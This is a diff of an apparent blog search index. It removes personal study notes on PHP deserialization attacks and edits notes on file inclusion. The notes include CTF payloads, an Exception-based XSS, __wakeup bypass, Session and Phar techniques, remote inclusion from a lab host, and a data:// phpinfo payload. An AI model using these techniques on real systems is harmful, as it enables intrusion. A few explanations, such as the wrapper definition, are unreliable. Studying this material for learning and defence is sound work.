@@ -344,304 +344,6 @@ SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
       </tags>
   </entry>
   <entry>
-    <title>序列化漏洞</title>
-    <url>/2026/06/26/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[一、PHP序列化与反序列化1. 基础概念
-序列化：将变量&#x2F;对象的数据转换为字符串，用于存储、网络传输。
-反序列化：将序列化后的字符串，还原为原本的变量&#x2F;对象。
-核心函数：
-serialize()：将对象&#x2F;变量转为序列化字符串
-unserialize()：将序列化字符串还原为对象&#x2F;变量
-
-
-
-补充概念
-类：一类事物的抽象定义，包含属性（特征）、方法（动作&#x2F;功能）。示例：
-汽车类：属性（颜色、马力），方法（启动、刹车）
-人类：属性（姓名、身高），方法（吃饭、睡觉）
-
-
-对象：类在内存中的实例化产物，是具体的个体。示例：车牌号京Axxxx的汽车、身份证号11010xxxxx的张三。
-主流编程语言（除C语言外）基本都支持面向对象与序列化操作。
-流转示意：对象 → 序列化 → 字节码&#x2F;字符串 → 网络传输&#x2F;存储 → 反序列化 → 还原对象
-
-2. 无类序列化案例案例1 基础字符串序列化&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;KFC&quot;;$str = $_GET[&#x27;str&#x27;];if(unserialize($str)===$KEY)&#123;echo &quot;$flag&quot; .&quot;&lt;/br&gt;&quot;;&#125;show_source(__FILE__);?&gt;
-
-解题操作使用PHP在线工具执行序列化代码：
-&lt;?phpecho serialize(&#x27;KFC&#x27;);?&gt;
-
-输出结果：s:3:&quot;KFC&quot;;
-格式说明：s代表字符串，6代表字符串字符长度。
-构造 payload：?str=s:3:&quot;KFC&quot;;
-案例2 CTF Cookie序列化题目页面代码：
-...&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123;show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;else&#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;&lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;?php&#125;$KEY = &#x27;ISecer:www.isecer.com&#x27;;?&gt;
-
-错误思路直接序列化ISecer:www.isecer.com，得到s:21:&quot;ISecer:www.isecer.com&quot;;，设置Cookie访问，结果无效。原因：$KEY变量在判断逻辑之后赋值，判断执行时$KEY为空字符串。
-正确解法序列化空字符串：
-&lt;?phpecho serialize(&quot;&quot;);?&gt;
-
-输出：s:0:&quot;&quot;;构造请求包，设置Cookie: ISecer=s:0:&quot;&quot;;
-3. 类与对象序列化（1）对象序列化&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$p = new Person();$obj = serialize($p);print_r($obj);?&gt;
-
-
-运行结果：O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;}格式说明：O代表对象，6为类名字符长度，2为对象属性个数。
-（2）对象反序列化&lt;?php$obj = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;;print_r(unserialize($obj));?&gt;
-
-
-（3）修改属性后反序列化简单来说，“修改属性后反序列化”指的是：在将一个对象反序列化（还原成程序中的对象）之前，人为地修改了代表该对象的“序列化字符串”的内容。
-&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$clz = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:25;&#125;&#x27;;$per = unserialize($clz);print_r($clz);echo &quot;&lt;br&gt;&quot;;echo $per-&gt;name;?&gt;
-
-
-4. 不同访问修饰符的序列化格式
-public（公共）：本类、子类、外部均可访问，序列化直接显示属性名。
-protected（受保护）：仅本类、子类可访问，序列化格式：\x00*\x00属性名（\x00为空字节）。
-private（私有）：仅本类内部可访问，序列化格式：\x00类名\x00属性名。
-
-示例：
-&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;protected $hobby = &#x27;eat&#x27;;private $age = 18;&#125;$p = new Person();$obj = serialize($p);echo &quot;&lt;br&gt;&quot;;print_r($obj);?&gt;
-
-
-输出结果：O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:8:&quot;*hobby&quot;;s:3:&quot;eat&quot;;s:11:&quot;Personage&quot;;i:18;}
-5. __wakeup 绕过
-原理： 某些 PHP 版本中，如果序列化字符串表示的对象属性个数，大于实际定义的属性个数，PHP 会跳过 __wakeup() 方法。
-动作： 将 O:6:&quot;Person&quot;:1:{...} 中的 1 改为 2 或更大。
-用途： 绕过 __wakeup 中可能存在的安全检测。
-
-二、PHP魔术方法魔术方法：PHP在特定场景下自动调用的内置方法，序列化漏洞核心利用点。
-
-注：测试 PHP，为直观显示输出结果，我将 &lt;br&gt; HTML换行标签换成了 \n 纯文本换行符，方便直观分行。但部署到 Apache、Nginx 等 Web 服务器、浏览器访问时需改用 &lt;br&gt;，因为浏览器会把 PHP 输出内容当作 HTML 解析，文本换行 \n 只会显示成空格，只有 &lt;br&gt; 才能实现页面换行效果。
-
-1. __construct 与 __destruct
-__construct()：构造方法，对象创建时自动调用。
-__destruct()：析构方法，对象销毁时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;&lt;br&gt;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);echo &quot;&lt;br&gt;&quot;;?&gt;
-
-
-流程推演：
-
-new 一个对象会触发 __construct 并 echo ‘调用 construct’
-执行序列化任务
-整个 PHP 脚本运行结束（或变量被手动 unset）时，系统开始清理内存并销毁对象，此时会触发 __destruct，并 echo ‘调用 destruct’。
-
-2. __sleep 与 __wakeup
-__sleep()：对象序列化时自动调用。
-__wakeup()：对象反序列化时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __sleep()&#123;echo &quot;调用&quot;.&quot;__sleep&quot;;echo &quot;&lt;br&gt;&quot;;return array(&quot;name&quot;);&#125;function __wakeup()&#123;echo &quot;调用&quot;.&quot;__wakeup&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;echo &quot;&lt;br&gt;&quot;;$c=unserialize($b);var_dump($c);?&gt;
-
-
-流程推演：
-
-new 一个对象 $a，触发 __construct。 
-调用 serialize($a)，在转换为字符串之前，触发 __sleep。
-echo 打印序列化结果。
-调用 unserialize()，系统根据字符串在内存中生成了一个全新的对象，并触发 __wakeup。
-var_dump 打印反序列化结果。
-当程序彻底结束运行时，系统开始清空内存。因为此时内存中同时存活住了两个对象（一开始 new 出来的 $a，和后来 unserialize 捏造出来的新对象），连续触发了两次 __destruct。
-
-注意：
-反序列化的入口必须是字符串，绝对不能是对象本身。unserialize() 这个函数的功能是”把字符串变回对象”。因此，它只能接收字符串作为参数。也不可以直接用 echo 打印对象。
-因此代码不可以写成：
-$a= new Person();echo serialize($a);$b = $a; 			//给 $b 赋值一串字符串：$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;$c = unserialize($b);echo &quot;$c&quot;;		//var_dump($c); 或者用 print_r($c);
-
-3. __get 与 __set
-__get()：访问不存在&#x2F;私有属性时自动调用。
-__set()：赋值给不存在&#x2F;私有属性时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;private $str = &#x27;hello&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __get($b) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__get&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;function __set($name,$value) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__set&quot;;echo &quot;&lt;br&gt;&quot;;$this-&gt;str = $value;&#125;&#125;$a= new Person();echo $a-&gt;age;$a-&gt;age=13;echo $a-&gt;str;?&gt;
-
-
-流程推演：
-
-new 一个对象 $a，触发 __construct 执行。输出 调用 __construct()。
-读拦截 (__get)：执行 echo $a-&gt;age;。因为 age 这个属性在类里不可访问，系统立刻拦截，触发了 __get 方法。
-__get 内部先输出了 调用 __get。
-然后它执行了 return $this-&gt;str;初始值应该是 &#39;hello&#39;。
-
-
-echo 拿到返回值，打印出了 hello。
-写拦截 (__set)： 执行 $a-&gt;age = 13;给一个不存在的属性 age 强行赋值。系统再次拦截，触发了 __set 方法。
-__set 内部先输出了 调用 __set。
-接着执行 $this-&gt;str = $value;传进来的 13赋值给了内部的 $str 属性。
-
-
-再次读拦截： 执行 echo $a-&gt;str;
-系统再次触发 __get，输出 调用 __get。
-此时返回 $this-&gt;str，因为上一步它已经被改成了 13，所以外部的 echo 最终打印出了 13。
-
-
-脚本执行结束，内存清空销毁对象，自动触发 __destruct，输出 调用 __destruct()。
-
-4. __call 与 __callStatic
-__call()：调用对象中不存在的实例方法时自动调用。
-__callStatic()：调用类中不存在的静态方法时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;public $str = &#x27;hello&#x27;;public static function myStaticMethod() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;myStaticMethod&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __call($b,$q) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__call&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;public static function __callStatic($func, $arguments)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__callStatic&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a-&gt;method();Person::myStaticMethod();Person::method2();?&gt;
-
-
-流程推演：
-
-创建对象 $a。自动触发 __construct()。输出调用 __construct()
-echo $a-&gt;method();PHP 引擎试图在 $a 这个对象里寻找一个叫 method() 的普通方法。但是并不存在。触发 __call($b, $q)，先输出 调用 __call。接着代码里写了 return $this-&gt;str;，于是把内部属性 &#39;hello&#39; 返回给了外面的 echo，最终在屏幕上打印出了 hello。
-Person::myStaticMethod();，:: 是静态调用的符号。PHP 引擎去 Person 类里找 myStaticMethod()。发现这个静态方法真实存在，且权限是 public。直接执行该方法，输出 调用 myStaticMethod。
-Person::method2();PHP 引擎试图静态调用一个叫 method2() 的方法。发现并不存在。触发__callStatic($func, $arguments)，输出 调用 __callStatic。
-脚本运行结束，内存开始清空自动触发 __destruct()。输出调用 __destruct()。
-
-5. __toString 与 __clone
-__toString()：对象被当作字符串使用&#x2F;输出时自动调用。
-__clone()：使用clone关键字克隆对象时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __toString() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__toString&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;name;&#125;function __clone() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__clone&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo $a . &#x27;&lt;br&gt;&#x27;;$b = $a;echo $a === $b;$c = clone $a;echo $a === $c;?&gt;
-
-
-流程推演：
-
-new 一个对象$a，输出调用 __construct()
-echo $a . &#39;&lt;br&gt;&#39;;对象 $a 和一个字符串 &#39;&lt;br&gt;&#39; 拼接在一起打印。为了防止报错，系统强行触发了对象的 __toString() 方法。输出调用 __toString，然后把返回的 $this-&gt;name（也就是 &#39;Jack&#39;）拼接到 &lt;br&gt; 前面输出。
-引用赋值$b = $a;
-echo $a === $b;结果为 true。经过 echo 的强制类型转换。打印出数字 1。
-$c = clone $a;创造了一个新对象 $c，它的属性和 $a 一模一样，但它们在内存中是独立的两个实体。新对象诞生时自动触发 __clone()。输出调用 __clone。
-echo $a === $c;再次比较，虽然长得一样，但已经是两个不同的实体了，所以结果为 false。echo false 在 PHP 中输出空字符串。
-代码执行结束，内存开始清空。两个对象被销毁，连续打印两次 调用 __destruct()。
-
-6. __invoke将对象当作函数直接调用时自动触发。示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __invoke($p1,$p2) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__invoke&quot;;echo &quot;&lt;br&gt;&quot;;return $p1 . &quot;---&quot; . $p2;&#125;&#125;$a= new Person();echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);?&gt;
-
-
-流程推演：
-
-创建对象 $a，触发 __construct()。调用 __construct()。
-echo $a(&quot;Jack&quot;,&quot;is a hacker&quot;);把一个对象（$a）当成了函数来加括号调用。括号里传的两个字符串 &quot;Jack&quot; 和 &quot;is a hacker&quot;传给了 __invoke($p1, $p2)。
-先触发内部的 echo 输出 调用 __invoke。接着执行 return 语句将两个参数拼接。输出Jack---is a hacker。
-程序结束，内存清空，对象销毁，触发 __destruct()。输出调用 __destruct()。
-
-7. __isset 与 __unset
-__isset()：对不可访问属性执行isset()/empty()时自动调用。
-__unset()：对不可访问属性执行unset()销毁时自动调用。
-
-示例：
-&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $sex;private $name;private $age;public function __construct($name = &#x27;&#x27;, $age = 25, $sex = &#x27;男&#x27;)&#123;$this-&gt;name = $name;$this-&gt;age = $age;$this-&gt;sex = $sex;&#125;public function __isset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __isset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;public function __unset($name)&#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __unset()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$person = new Person(&#x27;Jack&#x27;, 18, &#x27;male&#x27;);// __isset()echo isset($person-&gt;sex);echo isset($person-&gt;name);echo isset($person-&gt;age);// __unset()echo &quot;\n&quot;;unset($person-&gt;name);unset($person-&gt;sex);echo isset($person-&gt;sex) ? &#x27;has&#x27; : &#x27;not_has&#x27;, &quot;\n&quot;;?&gt;
-
-
-流程推演：
-
-new 一个对象，包含公开属性 sex，私有属性 name 和 age。 
-echo isset($person-&gt;sex);代码可以直接拿到公开的数据 sex（不触发魔术方法）；但是对于私有数据无法直接接触。因为 sex 是 public，系统直接放行，结果为 true。经过 echo 的强制类型转换，屏幕上打出了数字 1。
-echo isset($person-&gt;name);``echo isset($person-&gt;age);当执行 isset 探测 name和age 时，因为权限不够，连续两次被拦截并触发了 __isset 方法，输出了两次提示。 
-代码试图用 unset 销毁私有的 name，再次被拦截，触发了 __unset 方法并输出提示。
-当试图销毁公开的 sex 时，因为权限足够，系统没有拦截，而是直接在内存里把它真实删除了。 
-最后用三目运算符再次探测 sex 时，发现它已经被删没了，所以输出了 not_has。
-
-三、CTF 序列化实战题目示例：CTF-XSS 结合反序列化页面代码 ctf_xss.php
-&lt;?phphighlight_file(__file__);$a = unserialize($_GET[&#x27;k&#x27;]);echo $a;?&gt;
-
-解题思路
-代码调用unserialize反序列化，且直接echo输出对象，触发__toString魔术方法。
-利用PHP原生类（无需自定义）Exception，该类存在__toString方法。
-构造包含XSS语句的Exception对象，序列化后传入参数。
-
-构造代码&lt;?php$e = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($e));?&gt;
-
-将输出字符串作为k参数传入，触发XSS弹窗。
-流程推演：
-
-当服务器执行到 echo $a; 时，强行触发了 Exception 对象的 __toString。
-__toString 强制输出了报错信息，导致原本在 PHP 后端内存对象里的恶意 JS 代码&lt;script&gt;alert(1)&lt;/script&gt;被提取出来，当作一串普通的字符串，拼接到了最终要发送的 HTML 网页源码里。
-服务器把拼凑好的 HTML 源码通过网络发送给了普通用户的浏览器。前端开始逐行解析网页准备渲染画面。当浏览器解析到 &lt;script&gt; 这个标签时，它的 JS 引擎被瞬间激活执行了这句 JavaScript 语句，成功弹出了框框。
-
-补充：查看PHP所有原生魔术方法类&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;$methods = get_class_methods($class);foreach ($methods as $method) &#123;if (in_array($method, array(&#x27;__destruct&#x27;,&#x27;__toString&#x27;,&#x27;__wakeup&#x27;,&#x27;__call&#x27;,&#x27;__callStatic&#x27;,&#x27;__get&#x27;,&#x27;__set&#x27;,&#x27;__isset&#x27;,&#x27;__unset&#x27;,&#x27;__invoke&#x27;,&#x27;__set_state&#x27;))) &#123;print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;&#125;&#125;&#125;?&gt;
-
-Exception::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_stateDOMException::__wakeupDOMException::__toStringJsonException::__wakeupJsonException::__toStringLogicException::__wakeupLogicException::__toStringBadFunctionCallException::__wakeupBadFunctionCallException::__toStringBadMethodCallException::__wakeupBadMethodCallException::__toStringDomainException::__wakeupDomainException::__toStringInvalidArgumentException::__wakeupInvalidArgumentException::__toStringLengthException::__wakeupLengthException::__toStringOutOfRangeException::__wakeupOutOfRangeException::__toStringRuntimeException::__wakeupRuntimeException::__toStringOutOfBoundsException::__wakeupOutOfBoundsException::__toStringOverflowException::__wakeupOverflowException::__toStringRangeException::__wakeupRangeException::__toStringUnderflowException::__wakeupUnderflowException::__toStringUnexpectedValueException::__wakeupUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringSplFixedArray::__wakeupPDOException::__wakeupPDOException::__toStringReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringAssertionError::__wakeupAssertionError::__toStringSimpleXMLElement::__toStringSimpleXMLIterator::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toString
-
-利用：
-XSS &#x2F; 信息泄露： 利用 Exception 或 Error。遇到 echo 时，其 __toString 会将肚子里的报错信息（恶意代码）吐到前端。
-SSRF (内网探针) ： 利用 SoapClient。触发其 __call 方法可强行向内网发送 HTTP 请求。
-文件&#x2F;目录遍历： 利用 DirectoryIterator 或 FilesystemIterator 配合 __toString 读取敏感目录。
-Phar 反序列化： 利用 Phar。无需 unserialize，只需普通文件读取操作（如 file_exists, filesize, file_get_contents, md5_file 等）即可引爆反序列化。
-
-四、PHP 反序列化攻击
-核心： 寻找从入口unserialize()到危险函数的“多米诺骨牌”（POP 链）。
-显式入口 (函数类)： 代码直接调用 unserialize()。
-隐式入口 (协议&#x2F;机制类)：
-Phar 协议： 利用 phar:// 伪协议，通过文件操作触发。
-Session 机制： 利用 session.serialize_handler 引擎不一致触发。
-
-
-
-Exception XSS
-触发条件： 存在 unserialize() 入口 &amp;&amp; echo&#x2F;print 输出点。
-动作： 构造 new Exception(&quot;&lt;script&gt;...&quot;)。
-关键点： 触发 Exception::__toString。
-
-Session 反序列化
-触发条件： 存在“存取引擎不一致” (php vs php_serialize)。
-动作： 
-寻找写入 Session 的接口，投毒 Payload：| + 序列化字符串。
-触发读取 Session 的页面，触发引擎自动反序列化。
-
-
-关键点： session.auto_start=1 导致的顺序冲突。
-注：若条件竞争不成功，增加上传文件大小（上传超大文件）以延长 Session 文件存活时间，扩大 0.01 秒的窗口期。 增加文件大小 &#x3D; “让子弹多飞一会儿”，增加命中概率。
-
-Phar 反序列化
-触发条件： 代码存在任意文件操作函数 (file_exists, md5_file 等)。
-动作： phar:// + 伪装后缀 (.jpg)。
-关键点： 利用 PHP 底层 phar:// 协议强制反序列化。
-注：Phar 文件必须包含合法签名（如 \x00\x00\xfe\x01）。若手动修改或生成时破坏了签名，PHP 将拒绝识别文件，导致漏洞无法触发。
-
-五、总结Q1: PHP 序列化漏洞中，有哪些魔术方法？
-__construct ⭐️构造方法，仅new创建对象时自动触发，反序列化不会执行。
-__destruct ⭐️析构方法，对象销毁、脚本运行结束、反序列化完成后自动触发。
-__toString将对象当作字符串输出、拼接时自动触发。
-__wakeup ⭐️执行反序列化unserialize()时最先触发，存在经典属性数量绕过漏洞。
-__sleep执行序列化serialize()对象前自动触发。
-__call调用不存在或无访问权限的方法时自动触发。
-__get读取不存在、私有&#x2F;受保护不可访问的属性时自动触发。
-__set修改不存在、私有&#x2F;受保护不可访问的属性时自动触发。
-__invoke把对象当作函数（$obj()）调用时自动触发。
-
-Q2: 序列化和反序列化的过程是什么？序列化：把内存中的对象，转换成字符串或字节码，便于存储和网络传输
-反序列化：把字符串或字节码还原为内存中的对象
-Q3: 序列化漏洞的产生原因是什么？用户可以通过 HTTP、或其他网络协议向服务器发送任意的序列化字符串或字节码，服务器未经严格验证就进行了反序列化。
-Q4: 反序列化漏洞的危害有哪些？RCE（远程代码执行），权限提升，敏感信息泄露，DDOS攻击，内网渗透（以该服务器为跳板，攻击公司内网中的其他设备）
-Q5: POP链是什么？攻击者通过控制对象的属性，将程序中现有的多个代码片段（Gadgets）像接龙一样串联起来，最终形成的一条攻击路径。
-Q6: session 反序列化是什么？session 反序列化漏洞是指攻击者通过篡改储存在 session 中的序列化数据，利用服务器解析（还原）这些数据时的逻辑缺陷，从而实现越权访问或远程执行恶意代码的安全漏洞。
-Q7: session 反序列化的形成原因是什么？
-php 使用了不同的 session 序列化引擎处理 session（存入 Session 时使用新引擎 php_serialize（无竖线），读取时使用旧引擎 php（以竖线 | 分割键值）。核心在于读取时，PHP 引擎会对 Session 中的竖线 | 进行切分，并将右侧数据强制反序列化。）
-php 保存 session 的过程是序列化，php 读取 session 的过程是反序列化。
-
-Q8: session 反序列化的危害是什么？RCE（远程代码执行）
-Q9: session 序列化引擎有哪些？PHP、PHP_serialize、PHP_binary
-username=zhangsan的结果是 PHP引擎： username | s:8:&quot;zhangsan&quot;; PHP_serialize引擎: a:1:&#123;s:8:&quot;username&quot;;s:8:&quot;zhangsan&quot;;&#125; php_binary引擎: [BS]�usernames:8:&quot;zhangsan&quot;;
-
-Q10: 文件上传进度反序列化是什么？文件上传进度反序列化是指攻击者通过在上传表单中构造恶意的进度标识符，利用 PHP 自动将上传信息存入 session 的机制，结合 session 引擎解析差异，强制服务器在后台还原恶意对象从而触发代码执行。
-Q11: 文件上传进度反序列化的作用是什么？php会话上传进度，phpinfo信息泄露可以看到对应的信息
-
-session.upload_progress.enabled 会话上传进度是否开启
-session.upload_progress.name 会话上传进度名
-session.upload_progress.cleanup 会话上传进度是否会自动清理
-
-当一个文件上传时，PHP 会检查 HTTP 请求。如果发现请求中包含一个特定的变量（默认名称为PHP_SESSION_UPLOAD_PROGRESS），它就会在 $_SESSION 数组中创建一个特殊的键。可用于Session序列化漏洞
-这个键里包含了文件的总大小、当前已上传的大小、预计剩余时间等实时数据。前端可以通过另一个异步请求（AJAX）读取这些 Session 数据，从而绘制出进度条。
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSRF与SSRF漏洞</title>
     <url>/2026/06/08/CSRF-SSRF/index/</url>
     <content><![CDATA[一、CSRF（跨站请求伪造）1. 简介与危害
@@ -3975,7 +3677,6 @@ Web安全核心原则：不信任任何外部传入参数
 白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
 黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
 
-
 二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
 (1) 无后缀拼接限制服务端代码1.php
 &lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
@@ -3992,7 +3693,7 @@ txt文件被PHP解析执行。
 原理：%00终止字符串，.html被舍弃。
 访问：http://localhost/include/upload2.php?filename=1.txt%00
 
-2. 超长路径截断
+②超长路径截断
 原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
 ?filename=1.txt......................................................................
 
@@ -4005,7 +3706,6 @@ txt文件被PHP解析执行。
 
 方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
 方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
-
 
 三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
 
@@ -4068,7 +3768,7 @@ on
 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
 
 
-1. http&#x2F;https协议远程包含常规协议。
+1、http&#x2F;https协议远程包含常规协议。
 (高亮的部分是伪协议）
 http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 
@@ -4101,7 +3801,6 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
 ?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 
-
 四、不安全文件下载漏洞1. 原理
 本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
